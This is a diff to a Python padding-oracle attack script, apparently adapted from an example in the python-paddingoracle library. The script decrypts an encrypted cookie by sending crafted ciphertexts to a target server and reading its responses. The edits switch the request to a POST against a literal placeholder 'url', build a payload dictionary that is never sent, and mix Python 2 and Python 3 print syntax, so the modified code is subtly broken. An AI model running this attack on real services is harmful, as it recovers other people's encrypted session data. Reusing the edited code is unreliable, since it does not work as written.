@@ -15,12 +15,15 @@ class PadBuster(PaddingOracle):
 
     def oracle(self, data, **kwargs):
         somecookie = quote(b64encode(data))
-        self.session.cookies['somecookie'] = somecookie
+        # self.session.cookies['somecookie'] = somecookie
 
         while 1:
             try:
-                response = self.session.get('http://www.example.com/',
-                        stream=False, timeout=5, verify=False)
+                data = {"key":somecookie}
+                url = 'url'
+                response = self.session.post('%s' % url,
+                                             stream=False, timeout=5, verify=False)
+                print response
                 break
             except (socket.error, requests.exceptions.RequestException):
                 logging.exception('Retrying request in %.2f seconds...',
@@ -42,7 +45,7 @@ if __name__ == '__main__':
     import sys
 
     if not sys.argv[1:]:
-        print 'Usage: %s <somecookie value>' % (sys.argv[0], )
+        print( "Usage: %s <somecookie value>" % (sys.argv[0]))
         sys.exit(1)
 
     logging.basicConfig(level=logging.DEBUG)
@@ -53,4 +56,4 @@ if __name__ == '__main__':
 
     cookie = padbuster.decrypt(encrypted_cookie, block_size=8, iv=bytearray(8))
 
-    print('Decrypted somecookie: %s => %r' % (sys.argv[1], cookie))
+    print('Decrypted key: %s => %r' % (sys.argv[1], cookie))
